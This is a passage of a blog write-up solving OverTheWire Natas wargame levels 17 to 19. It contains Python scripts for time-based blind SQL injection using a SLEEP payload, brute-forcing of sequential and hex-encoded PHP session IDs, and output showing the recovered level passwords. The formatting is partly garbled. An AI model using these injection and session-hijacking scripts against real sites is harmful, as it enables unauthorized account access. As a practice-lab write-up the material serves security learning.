                <span class="k">print</span><span class="p">(</span><span class="s">&quot;Position </span><span class="si">%d</span><span class="s">: trying </span><span class="si">%s</span><span class="s">... Time: </span><span class="si">%.3f</span><span class="s">&quot;</span> <span class="o">%</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">CHARS</span><span class="p">[</span><span class="n">j</span><span class="p">],</span> <span class="n">time</span><span class="p">))</span>
                <span class="c">#print r.url</span>
                <span class="k">if</span> <span class="n">time</span> <span class="o">&gt;=</span> <span class="mi">9</span><span class="p">:</span>
                    <span class="n">password</span> <span class="o">+=</span> <span class="n">CHARS</span><span class="p">[</span><span class="n">j</span><span class="p">]</span>
                    <span class="k">print</span><span class="p">(</span><span class="s">&quot;Password so far: &quot;</span> <span class="o">+</span> <span class="n">password</span><span class="p">)</span>
                    <span class="k">break</span>

        <span class="k">return</span> <span class="n">password</span>



<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">&#39;__main__&#39;</span><span class="p">:</span>

        <span class="c"># authorization: login and password</span>
        <span class="n">AUTH</span> <span class="o">=</span> <span class="p">(</span><span class="s">&#39;natas17&#39;</span><span class="p">,</span> <span class="s">&#39;8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw&#39;</span><span class="p">)</span>


        <span class="c"># BASE64 password and 32 bytes</span>
        <span class="n">CHARS</span> <span class="o">=</span> <span class="n">string</span><span class="o">.</span><span class="n">ascii_letters</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">digits</span>
        <span class="n">LENGTH</span> <span class="o">=</span> <span class="mi">32</span>

        <span class="c"># crafted url option 1</span>
        <span class="n">SQL_URL1</span> <span class="o">=</span> <span class="s">&#39;http://natas17.natas.labs.overthewire.org?username=natas18&quot; AND SUBSTRING(password,&#39;</span>
        <span class="n">SQL_URL2</span> <span class="o">=</span> <span class="s">&#39;,1) LIKE BINARY &quot;&#39;</span>
        <span class="n">SQL_URL3</span> <span class="o">=</span> <span class="s">&#39;&quot; AND SLEEP(10) AND &quot;1&quot;=&quot;1&#39;</span>

        <span class="k">print</span><span class="p">(</span><span class="n">brute_force_password</span><span class="p">(</span><span class="n">LENGTH</span><span class="p">,</span> <span class="n">AUTH</span><span class="p">,</span> <span class="n">CHARS</span><span class="p">,</span> <span class="n">SQL_URL1</span><span class="p">,</span> <span class="n">SQL_URL2</span><span class="p">))</span>
</pre></div>


<p>Around 15 minutes later I got the password.</p>
<h3>Level 18:</h3>
<p>The 18th level starts with a login form, just like the ???.</p>
<p>The sourcecode is long so lets go by parts.</p>
<p>The  it declares the size of the id. this is important if we want to brute force it:</p>
<div class="highlight"><pre><span class="x">$maxid = 640; // 640 should be enough for everyone</span>
</pre></div>


<p>The its check if a variable *$id$ is a number with the PHP function [is_numeric]:</p>
<p>http://php.net/manual/en/function.is-numeric.php</p>
<div class="highlight"><pre><span class="x">function isValidID($id) { /* {{{ */</span>
<span class="x">    return is_numeric($id);</span>
<span class="x">}</span>
</pre></div>


<p>http://php.net/manual/en/function.array-key-exists.php</p>
<p>The most part is this if clause checking the function *my_session_start(), defined bellow. If it's true, it calls the function that prints the credentials also bellow.</p>
<p>If not, it looks to the http request and search for username and password. In case positive, it create a session id, with a function definied bellw and then <em>session_starts(</em>)</p>
<p>$_REQUEST is An associative array that by default contains the contents of $_GET, $_POST and $_COOKIE.</p>
<p>http://php.net/manual/en/reserved.variables.request.php</p>
<p>http://php.net/manual/en/reserved.variables.session.php</p>
<p>array containing session variables available to the current script.  it sees if its the username is admin, and session hets this value</p>
<div class="highlight"><pre><span class="x">$showform = true;</span>
<span class="x">if(my_session_start()) {</span>
<span class="x">    print_credentials();</span>
<span class="x">    $showform = false;</span>
<span class="x">} else {</span>
<span class="x">    if(array_key_exists(&quot;username&quot;, $_REQUEST) &amp;&amp; array_key_exists(&quot;password&quot;, $_REQUEST)) {</span>
<span class="x">    session_id(createID($_REQUEST[&quot;username&quot;]));</span>
<span class="x">    session_start();</span>
<span class="x">    $_SESSION[&quot;admin&quot;] = isValidAdminLogin();</span>
<span class="x">    debug(&quot;New session started&quot;);</span>
<span class="x">    $showform = false;</span>
<span class="x">    print_credentials();</span>
<span class="x">    }</span>
<span class="x">}</span>

<span class="x">if($showform) {</span>
<span class="x">?&gt;</span>
</pre></div>


<p>The next function create an random id number withint the value defined by <em>$maxid</em>:</p>
<div class="highlight"><pre><span class="x">function createID($user) { /* {{{ */</span>
<span class="x">    global $maxid;</span>
<span class="x">    return rand(1, $maxid);</span>
<span class="x">}</span>
</pre></div>


<p>http://php.net/manual/en/function.session-start.php</p>
<p>This function start the session. If first check whether the session id is in the cookie and if this session id is a number. If it is, check if its a fresh session. If true, checks if the  word admin is in SESSION, if it os, invalidate teh session:</p>
<p>http://en.wikipedia.org/wiki/Session_ID</p>
<div class="highlight"><pre><span class="x">function my_session_start() { /* {{{ */</span>
<span class="x">    if(array_key_exists(&quot;PHPSESSID&quot;, $_COOKIE) and isValidID($_COOKIE[&quot;PHPSESSID&quot;])) {</span>
<span class="x">    if(!session_start()) {</span>
<span class="x">        debug(&quot;Session start failed&quot;);</span>
<span class="x">        return false;</span>
<span class="x">    } else {</span>
<span class="x">        debug(&quot;Session start ok&quot;);</span>
<span class="x">        if(!array_key_exists(&quot;admin&quot;, $_SESSION)) {</span>
<span class="x">        debug(&quot;Session was old: admin flag set&quot;);</span>
<span class="x">        $_SESSION[&quot;admin&quot;] = 0; // backwards compatible, secure</span>
<span class="x">        }</span>
<span class="x">        return true;</span>
<span class="x">    }</span>
<span class="x">    }</span>

<span class="x">    return false;</span>
<span class="x">}</span>
</pre></div>


<p>function isValidAdminLogin() { /<em> {{{ </em>/
    if($_REQUEST["username"] == "admin") {
    /<em> This method of authentication appears to be unsafe and has been disabled for now. </em>/
        //return 1;
    }</p>
<div class="highlight"><pre><span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</pre></div>


<p>This just show messgaes</p>
<div class="highlight"><pre><span class="x">function debug($msg) { /* {{{ */</span>
<span class="x">    if(array_key_exists(&quot;debug&quot;, $_GET)) {</span>
<span class="x">        print &quot;DEBUG: $msg&lt;br&gt;&quot;;</span>
<span class="x">    }</span>
<span class="x">}</span>
</pre></div>


<p>If thesessio has admin with 1, shows the password:</p>
<div class="highlight"><pre><span class="x">function print_credentials() { /* {{{ */</span>
<span class="x">    if($_SESSION and array_key_exists(&quot;admin&quot;, $_SESSION) and $_SESSION[&quot;admin&quot;] == 1) {</span>
<span class="x">    print &quot;You are an admin. The credentials for the next level are:&lt;br&gt;&quot;;</span>
<span class="x">    print &quot;&lt;pre&gt;Username: natas19\n&quot;;</span>
<span class="x">    print &quot;Password: &lt;censored&gt;&lt;/pre&gt;&quot;;</span>
<span class="x">    } else {</span>
<span class="x">    print &quot;You are logged in as a regular user. Login as an admin to retrieve credentials for natas19.&quot;;</span>
<span class="x">    }</span>
<span class="x">}</span>
</pre></div>


<p>If the session ID is the admin session ID = 1, the password for the next is shown.</p>
<p>So, in resume, to complete this level, we would need to suply login credentials for an admin user. However there is session ide on it, given by the variable PHPSESSID. If the this value is the admin session id, we get the credentials.</p>
<p>We cant manualy set the values of PHPSSID because there is a checking if the session is ffres.</p>
<p>The way we are going to solve this is by performing brute force attack for each possible session value</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27</pre></div></td><td class="code"><div class="highlight"><pre><span class="c">#! /usr/bin/python</span>

<span class="kn">import</span> <span class="nn">requests</span>


<span class="k">def</span> <span class="nf">brute_force_password</span><span class="p">(</span><span class="n">AUTH</span><span class="p">,</span> <span class="n">URL</span><span class="p">,</span> <span class="n">PAYLOAD</span><span class="p">,</span> <span class="n">MAXID</span><span class="p">):</span>

    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">MAXID</span><span class="p">):</span>
        <span class="n">HEADER</span> <span class="o">=</span><span class="p">{</span><span class="s">&#39;Cookie&#39;</span><span class="p">:</span><span class="s">&#39;PHPSESSID=&#39;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)}</span>
        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">URL</span><span class="p">,</span> <span class="n">auth</span><span class="o">=</span><span class="n">AUTH</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="n">PAYLOAD</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">HEADER</span><span class="p">)</span>

        <span class="k">if</span> <span class="s">&quot;You are an admin&quot;</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
            <span class="k">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
            <span class="k">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">url</span><span class="p">)</span>
            <span class="k">print</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">))</span>



<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">&#39;__main__&#39;</span><span class="p">:</span>

    <span class="n">AUTH</span> <span class="o">=</span> <span class="p">(</span><span class="s">&#39;natas18&#39;</span><span class="p">,</span> <span class="s">&#39;xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP&#39;</span><span class="p">)</span>
    <span class="n">URL</span> <span class="o">=</span> <span class="s">&#39;http://natas18.natas.labs.overthewire.org/index.php?&#39;</span>

    <span class="n">PAYLOAD</span> <span class="o">=</span> <span class="p">({</span><span class="s">&#39;debug&#39;</span><span class="p">:</span> <span class="s">&#39;1&#39;</span><span class="p">,</span> <span class="s">&#39;username&#39;</span><span class="p">:</span> <span class="s">&#39;user&#39;</span><span class="p">,</span> <span class="s">&#39;password&#39;</span><span class="p">:</span> <span class="s">&#39;pass&#39;</span><span class="p">})</span>
    <span class="n">MAXID</span> <span class="o">=</span> <span class="mi">640</span>

    <span class="n">brute_force_password</span><span class="p">(</span><span class="n">AUTH</span><span class="p">,</span> <span class="n">URL</span><span class="p">,</span> <span class="n">PAYLOAD</span><span class="p">,</span> <span class="n">MAXID</span><span class="p">)</span>
</pre></div>
</td></tr></table>

<div class="highlight"><pre><span class="mi">584</span>
<span class="mi">585</span>
<span class="o">&lt;</span><span class="nx">html</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="nb">head</span><span class="o">&gt;</span>
<span class="o">&lt;!--</span> <span class="nx">This</span> <span class="n">stuff</span> <span class="k">in</span> <span class="nx">the</span> <span class="k">header</span> <span class="nx">has</span> <span class="nx">nothing</span> <span class="k">to</span> <span class="k">do</span> <span class="k">with</span> <span class="nx">the</span> <span class="nx">level</span> <span class="o">--&gt;</span>
<span class="o">&lt;</span><span class="k">link</span> <span class="n">rel</span><span class="o">=</span><span class="s2">&quot;stylesheet&quot;</span> <span class="k">type</span><span class="o">=</span><span class="s2">&quot;text/css&quot;</span> <span class="n">href</span><span class="o">=</span><span class="s2">&quot;http://natas.labs.overthewire.org/css/level.css&quot;</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="k">link</span> <span class="n">rel</span><span class="o">=</span><span class="s2">&quot;stylesheet&quot;</span> <span class="n">href</span><span class="o">=</span><span class="s2">&quot;http://natas.labs.overthewire.org/css/jquery-ui.css&quot;</span> <span class="o">/&gt;</span>
<span class="o">&lt;</span><span class="k">link</span> <span class="n">rel</span><span class="o">=</span><span class="s2">&quot;stylesheet&quot;</span> <span class="n">href</span><span class="o">=</span><span class="s2">&quot;http://natas.labs.overthewire.org/css/wechall.css&quot;</span> <span class="o">/&gt;</span>
<span class="o">&lt;</span><span class="nb">script</span> <span class="n">src</span><span class="o">=</span><span class="s2">&quot;http://natas.labs.overthewire.org/js/jquery-1.9.1.js&quot;</span><span class="o">&gt;&lt;/</span><span class="nb">script</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="nb">script</span> <span class="n">src</span><span class="o">=</span><span class="s2">&quot;http://natas.labs.overthewire.org/js/jquery-ui.js&quot;</span><span class="o">&gt;&lt;/</span><span class="nb">script</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="nb">script</span> <span class="n">src</span><span class="o">=</span><span class="nx">http</span><span class="p">:</span><span class="c1">//natas.labs.overthewire.org/js/wechall-data.js&gt;&lt;/script&gt;&lt;script src=&quot;http://natas.labs.overthewire.org/js/wechall.js&quot;&gt;&lt;/script&gt;</span>
<span class="o">&lt;</span><span class="nb">script</span><span class="o">&gt;</span><span class="kd">var</span> <span class="n">wechallinfo</span> <span class="o">=</span> <span class="p">{</span> <span class="s2">&quot;level&quot;</span><span class="p">:</span> <span class="s2">&quot;natas18&quot;</span><span class="p">,</span> <span class="s2">&quot;pass&quot;</span><span class="p">:</span> <span class="s2">&quot;xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP&quot;</span> <span class="p">};</span><span class="o">&lt;/</span><span class="nb">script</span><span class="o">&gt;&lt;/</span><span class="nb">head</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="nb">body</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="nx">h1</span><span class="o">&gt;</span><span class="nx">natas18</span><span class="o">&lt;/</span><span class="nx">h1</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="nb">div</span> <span class="n">id</span><span class="o">=</span><span class="s2">&quot;content&quot;</span><span class="o">&gt;</span>
<span class="nb">DEBUG</span><span class="p">:</span> <span class="nx">Session</span> <span class="nb">start</span> <span class="nx">ok</span><span class="o">&lt;</span><span class="nx">br</span><span class="o">&gt;</span><span class="nx">You</span> <span class="nx">are</span> <span class="nx">an</span> <span class="nx">admin.</span> <span class="nx">The</span> <span class="nx">credentials</span> <span class="nb">for</span> <span class="nx">the</span> <span class="nb">next</span> <span class="nx">level</span> <span class="nx">are</span><span class="p">:</span><span class="o">&lt;</span><span class="nx">br</span><span class="o">&gt;&lt;</span><span class="nx">pre</span><span class="o">&gt;</span><span class="nx">Username</span><span class="p">:</span> <span class="nx">natas19</span>
<span class="nx">Password</span><span class="p">:</span> <span class="mi">4</span><span class="nx">IwIrekcuZlA9OsjOkoUtwU6lhokCPYs</span><span class="o">&lt;/</span><span class="nx">pre</span><span class="o">&gt;&lt;</span><span class="nb">div</span> <span class="n">id</span><span class="o">=</span><span class="s2">&quot;viewsource&quot;</span><span class="o">&gt;&lt;</span><span class="nx">a</span> <span class="n">href</span><span class="o">=</span><span class="s2">&quot;index-source.html&quot;</span><span class="o">&gt;</span><span class="nx">View</span> <span class="nx">sourcecode</span><span class="o">&lt;/</span><span class="nx">a</span><span class="o">&gt;&lt;/</span><span class="nb">div</span><span class="o">&gt;</span>
<span class="o">&lt;/</span><span class="nb">div</span><span class="o">&gt;</span>
<span class="o">&lt;/</span><span class="nb">body</span><span class="o">&gt;</span>
<span class="o">&lt;/</span><span class="nx">html</span><span class="o">&gt;</span>

<span class="mi">586</span>
<span class="mi">587</span>

<span class="sb">````</span>





<span class="err">###</span> <span class="nx">Level</span> <span class="mi">19</span><span class="p">:</span>


<span class="nx">This</span> <span class="nx">level</span> <span class="nx">looks</span> <span class="nx">exactly</span> <span class="nx">like</span> <span class="nx">the</span> <span class="nx">previous</span> <span class="nx">except</span> <span class="nx">that</span> <span class="nx">it</span> <span class="nx">says</span> <span class="o">*</span><span class="nx">This</span> <span class="nx">page</span> <span class="nx">uses</span> <span class="nx">mostly</span> <span class="nx">the</span> <span class="nx">same</span> <span class="nb">code</span> <span class="nx">as</span> <span class="nx">the</span> <span class="nx">previous</span> <span class="nx">level</span><span class="p">,</span> <span class="nx">but</span> <span class="nx">session</span> <span class="nx">IDs</span> <span class="nx">are</span> <span class="nx">no</span> <span class="nx">longer</span> <span class="nx">sequential...</span><span class="o">*</span><span class="nx">.</span>

<span class="nx">This</span> <span class="nb">time</span> <span class="nx">we</span> <span class="nx">have</span> <span class="nx">no</span> <span class="nx">access</span> <span class="k">to</span> <span class="nx">the</span> <span class="nx">sourcecode</span> <span class="k">to</span> <span class="nx">see</span> <span class="nx">how</span> <span class="nx">it</span> <span class="nx">works.</span>


<span class="mi">0</span>
<span class="p">{</span><span class="s1">&#39;PHPSESSID&#39;</span><span class="p">:</span> <span class="s1">&#39;3236312d75736572&#39;</span><span class="p">}</span>
<span class="mi">1</span>
<span class="p">{</span><span class="s1">&#39;PHPSESSID&#39;</span><span class="p">:</span> <span class="s1">&#39;3136372d75736572&#39;</span><span class="p">}</span>
<span class="mi">2</span>
<span class="p">{</span><span class="s1">&#39;PHPSESSID&#39;</span><span class="p">:</span> <span class="s1">&#39;3534342d75736572&#39;</span><span class="p">}</span>
<span class="mi">3</span>
<span class="p">{</span><span class="s1">&#39;PHPSESSID&#39;</span><span class="p">:</span> <span class="s1">&#39;3238352d75736572&#39;</span><span class="p">}</span>
<span class="mi">4</span>
<span class="p">{</span><span class="s1">&#39;PHPSESSID&#39;</span><span class="p">:</span> <span class="s1">&#39;3334332d75736572&#39;</span><span class="p">}</span>
<span class="mi">5</span>


<span class="mi">0</span>
<span class="mi">548</span><span class="na">-user</span>
<span class="mi">1</span>
<span class="mi">275</span><span class="na">-user</span>
<span class="mi">2</span>
<span class="mi">237</span><span class="na">-user</span>
<span class="mi">3</span>
<span class="mi">90</span><span class="na">-user</span>
<span class="mi">4</span>
<span class="mi">535</span><span class="na">-user</span>
<span class="mi">5</span>
<span class="mi">536</span><span class="na">-user</span>
<span class="mi">6</span>
<span class="mi">84</span><span class="na">-user</span>
<span class="mi">7</span>
<span class="mi">228</span><span class="na">-user</span>
<span class="mi">8</span>
<span class="mi">11</span><span class="na">-user</span>
<span class="mi">9</span>
<span class="mi">241</span><span class="na">-user</span>
<span class="mi">10</span>
<span class="mi">265</span><span class="na">-user</span>
<span class="mi">11</span>
<span class="mi">592</span><span class="na">-user</span>
<span class="mi">12</span>
<span class="mi">145</span><span class="na">-user</span>
</pre></div>


<p>HEADER ={'Cookie':'PHPSESSID=' + str(i)}
r = requests.post(URL, auth=AUTH, params=PAYLOAD, headers=HEADER)
print(str(i))
id_hex = requests.utils.dict_from_cookiejar(r.cookies)['PHPSESSID']
id = id_hex.decode('hex')
print id</p>
<div class="highlight"><pre>
</pre></div>


<p>python -c "print '3332302d75736572'.decode('hex')</p>
<blockquote>
<p>^C
05:34&gt;scully&gt;bt3gl&gt;Desktop&gt; python -c "print '3332302d75736572'.decode('hex')"
320-user
05:34&gt;scully&gt;bt3gl&gt;Desktop&gt; python -c "print '3234372d61646d696e'.decode('hex')"
247-admin
05:36&gt;scully&gt;bt3gl&gt;Desktop&gt; python -c "print '32342d61646d696e'.decode('hex')"
24-admin
```</p>
</blockquote>
<h1>! /usr/bin/python</h1>
<p>import requests</p>
<p>def brute_force_password(AUTH, URL, PAYLOAD, MAXID):</p>
<div class="highlight"><pre><span class="k">for</span> <span class="n">i</span> <span class="n">in</span> <span class="n">range</span><span class="p">(</span><span class="n">MAXID</span><span class="p">)</span><span class="o">:</span>
    <span class="n">HEADER</span> <span class="o">=</span><span class="p">{</span><span class="err">&#39;</span><span class="n">Cookie</span><span class="sc">&#39;:&#39;</span><span class="n">PHPSESSID</span><span class="o">=</span><span class="err">&#39;</span> <span class="o">+</span> <span class="p">(</span><span class="n">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="o">+</span> <span class="err">&#39;</span><span class="o">-</span><span class="n">admin</span><span class="err">&#39;</span><span class="p">).</span><span class="n">encode</span><span class="p">(</span><span class="err">&#39;</span><span class="n">hex</span><span class="err">&#39;</span><span class="p">)}</span>
    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">URL</span><span class="p">,</span> <span class="n">auth</span><span class="o">=</span><span class="n">AUTH</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="n">PAYLOAD</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">HEADER</span><span class="p">)</span>
    <span class="n">print</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>

    <span class="k">if</span> <span class="s">&quot;You are an admin&quot;</span> <span class="n">in</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="o">:</span>
        <span class="n">print</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
        <span class="n">print</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">url</span><span class="p">)</span>
</pre></div>


<p>if <strong>name</strong> == '<strong>main</strong>':</p>
<div class="highlight"><pre><span class="n">AUTH</span> <span class="o">=</span> <span class="p">(</span><span class="err">&#39;</span><span class="n">natas19</span><span class="err">&#39;</span><span class="p">,</span> <span class="err">&#39;</span><span class="mi">4</span><span class="n">IwIrekcuZlA9OsjOkoUtwU6lhokCPYs</span><span class="err">&#39;</span><span class="p">)</span>
<span class="n">URL</span> <span class="o">=</span> <span class="err">&#39;</span><span class="n">http</span><span class="o">:</span><span class="c1">//natas19.natas.labs.overthewire.org/index.php?&#39;</span>

<span class="n">PAYLOAD</span> <span class="o">=</span> <span class="p">({</span><span class="err">&#39;</span><span class="n">debug</span><span class="err">&#39;</span><span class="o">:</span> <span class="sc">&#39;1&#39;</span><span class="p">,</span> <span class="err">&#39;</span><span class="n">username</span><span class="err">&#39;</span><span class="o">:</span> <span class="err">&#39;</span><span class="n">admin</span><span class="err">&#39;</span><span class="p">,</span> <span class="err">&#39;</span><span class="n">password</span><span class="err">&#39;</span><span class="o">:</span> <span class="err">&#39;</span><span class="n">pass</span><span class="err">&#39;</span><span class="p">})</span>
<span class="n">MAXID</span> <span class="o">=</span> <span class="mi">640</span>

<span class="n">brute_force_password</span><span class="p">(</span><span class="n">AUTH</span><span class="p">,</span> <span class="n">URL</span><span class="p">,</span> <span class="n">PAYLOAD</span><span class="p">,</span> <span class="n">MAXID</span><span class="p">)</span>
</pre></div>


<p>498
499
500
501
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas19", "pass": "4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs" };</script></head>
<body>
<h1>natas19</h1>
<div id="content">
<p>
<b>
This page uses mostly the same code as the previous level, but session IDs are no longer sequential...
</b>
</p>
DEBUG: Session start ok<br>You are an admin. The credentials for the next level are:<br><pre>Username: natas20
Password: eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF</pre></div>
</body>
</html></p>
<p>http://natas19.natas.labs.overthewire.org/index.php?debug=1&amp;username=admin&amp;password=pass
502</p>
<hr />
<p>That's it. The <a href="">sourcecode is available</a> as usual.</p>
<p>Hack all the things!</p>
                </div><!-- /.entry-content -->
                <div class="comments">
                <h2>Comments !</h2>
                        <div id="disqus_thread"></div>
                        <script type="text/javascript">
                           var disqus_identifier = "exploiting-the-web-in-20-lessons-natas.html";
                           (function() {
                                var dsq = document.createElement('script');
                                dsq.type = 'text/javascript'; dsq.async = true;
                                dsq.src = 'http://bt3gl.disqus.com/embed.js';
                                (document.getElementsByTagName('head')[0] ||
                                 document.getElementsByTagName('body')[0]).appendChild(dsq);
                          })();
                        </script>
                </div>
        </article>
</section>
        </div><!--/span-->

                <div class="span3 well sidebar-nav" id="sidebar">
<ul class="nav nav-list">



<li class="nav-header"><h4>Categories</h4></li>
<li>
<a href="http://bt3gl.github.io/category/web-exploitation.html">
    <i class="icon-folder-open icon-large"></i>Web Exploitation
</a>
</li>
<li>
<a href="http://bt3gl.github.io/category/vulnerabilities.html">
    <i class="icon-folder-open icon-large"></i>Vulnerabilities
</a>
</li>
<li>
<a href="http://bt3gl.github.io/category/reverse-engineering.html">
    <i class="icon-folder-open icon-large"></i>Reverse Engineering
</a>
</li>
<li>
<a href="http://bt3gl.github.io/category/networking.html">
    <i class="icon-folder-open icon-large"></i>Networking
</a>
</li>
<li>
<a href="http://bt3gl.github.io/category/life.html">
    <i class="icon-folder-open icon-large"></i>Life
</a>
</li>
<li>
<a href="http://bt3gl.github.io/category/forensics.html">
    <i class="icon-folder-open icon-large"></i>Forensics
</a>
</li>
<li>
<a href="http://bt3gl.github.io/category/cryptography.html">
    <i class="icon-folder-open icon-large"></i>Cryptography
</a>
</li>

<br>

<li class="nav-header"><h4>Tags</h4></li>
<ul class="tagcloud">
<li class="tag-4">
    <a href="http://bt3gl.github.io/tag/base64.html">
        <i class="icon-tag icon-large"></i>base64
    </a>
</li>
<li class="tag-4">
    <a href="http://bt3gl.github.io/tag/hope.html">
        <i class="icon-tag icon-large"></i>Hope
    </a>
</li>
<li class="tag-1">
    <a href="http://bt3gl.github.io/tag/ctf.html">
        <i class="icon-tag icon-large"></i>CTF
    </a>
</li>
<li class="tag-4">
    <a href="http://bt3gl.github.io/tag/paillier.html">
        <i class="icon-tag icon-large"></i>Paillier
    </a>
</li>
<li class="tag-4">
    <a href="http://bt3gl.github.io/tag/lamp.html">
        <i class="icon-tag icon-large"></i>LAMP
    </a>
</li>
<li class="tag-4">
    <a href="http://bt3gl.github.io/tag/brute_force.html">
        <i class="icon-tag icon-large"></i>Brute_Force
    </a>
</li>
<li class="tag-2">
    <a href="http://bt3gl.github.io/tag/python.html">
        <i class="icon-tag icon-large"></i>Python
    </a>
</li>
<li class="tag-4">
    <a href="http://bt3gl.github.io/tag/outguess.html">
        <i class="icon-tag icon-large"></i>OutGuess
    </a>
</li>
<li class="tag-2">
    <a href="http://bt3gl.github.io/tag/wargames.html">
        <i class="icon-tag icon-large"></i>Wargames
    </a>
</li>
<li class="tag-4">
    <a href="http://bt3gl.github.io/tag/overflow.html">
        <i class="icon-tag icon-large"></i>Overflow
    </a>
</li>
<li class="tag-3">
    <a href="http://bt3gl.github.io/tag/vigenere.html">
        <i class="icon-tag icon-large"></i>Vigenere
    </a>
</li>
<li class="tag-4">
    <a href="http://bt3gl.github.io/tag/telnet.html">
        <i class="icon-tag icon-large"></i>telnet
    </a>
</li>
<li class="tag-4">
    <a href="http://bt3gl.github.io/tag/mem.html">
        <i class="icon-tag icon-large"></i>mem
    </a>
</li>
<li class="tag-1">
    <a href="http://bt3gl.github.io/tag/csaw.html">
        <i class="icon-tag icon-large"></i>CSAW
    </a>
</li>
<li class="tag-4">
    <a href="http://bt3gl.github.io/tag/buffer.html">
        <i class="icon-tag icon-large"></i>Buffer
    </a>
</li>
<li class="tag-4">
    <a href="http://bt3gl.github.io/tag/request.html">
        <i class="icon-tag icon-large"></i>request
    </a>
</li>
<li class="tag-4">
    <a href="http://bt3gl.github.io/tag/qpdf.html">
        <i class="icon-tag icon-large"></i>qpdf
    </a>
</li>
<li class="tag-4">
    <a href="http://bt3gl.github.io/tag/socket.html">
        <i class="icon-tag icon-large"></i>socket
    </a>
</li>
<li class="tag-4">
    <a href="http://bt3gl.github.io/tag/gdb.html">
        <i class="icon-tag icon-large"></i>gdb
    </a>
</li>
<li class="tag-4">
    <a href="http://bt3gl.github.io/tag/assembly.html">
        <i class="icon-tag icon-large"></i>Assembly
    </a>
</li>
<li class="tag-4">
    <a href="http://bt3gl.github.io/tag/linux.html">
        <i class="icon-tag icon-large"></i>Linux
    </a>
</li>
<li class="tag-4">
    <a href="http://bt3gl.github.io/tag/readelf.html">
        <i class="icon-tag icon-large"></i>readelf
    </a>
</li>
<li class="tag-4">
    <a href="http://bt3gl.github.io/tag/shellshock.html">
        <i class="icon-tag icon-large"></i>Shellshock
    </a>
</li>
<li class="tag-4">
    <a href="http://bt3gl.github.io/tag/ltrace.html">
        <i class="icon-tag icon-large"></i>ltrace
    </a>
</li>
<li class="tag-4">
    <a href="http://bt3gl.github.io/tag/uncompyle2.html">
        <i class="icon-tag icon-large"></i>uncompyle2
    </a>
</li>
<li class="tag-4">
    <a href="http://bt3gl.github.io/tag/hashcat.html">
        <i class="icon-tag icon-large"></i>hashcat
    </a>
</li>
<li class="tag-4">
    <a href="http://bt3gl.github.io/tag/stack.html">
        <i class="icon-tag icon-large"></i>Stack
    </a>
</li>
<li class="tag-4">
    <a href="http://bt3gl.github.io/tag/chaosreader.html">
        <i class="icon-tag icon-large"></i>Chaosreader
    </a>
</li>
<li class="tag-4">
    <a href="http://bt3gl.github.io/tag/jad.html">
        <i class="icon-tag icon-large"></i>jad
    </a>
</li>
<li class="tag-3">
    <a href="http://bt3gl.github.io/tag/pdf-parser.html">
        <i class="icon-tag icon-large"></i>pdf-parser
    </a>
</li>
<li class="tag-4">
    <a href="http://bt3gl.github.io/tag/oracle.html">
        <i class="icon-tag icon-large"></i>Oracle
    </a>
</li>
<li class="tag-4">
    <a href="http://bt3gl.github.io/tag/command-injection.html">
        <i class="icon-tag icon-large"></i>Command Injection
    </a>
</li>
<li class="tag-4">
    <a href="http://bt3gl.github.io/tag/command_injection.html">
        <i class="icon-tag icon-large"></i>Command_Injection
    </a>
</li>
<li class="tag-4">
    <a href="http://bt3gl.github.io/tag/sqli.html">
        <i class="icon-tag icon-large"></i>SQLi
    </a>
</li>
<li class="tag-4">
    <a href="http://bt3gl.github.io/tag/love.html">
        <i class="icon-tag icon-large"></i>Love
    </a>
</li>
<li class="tag-4">
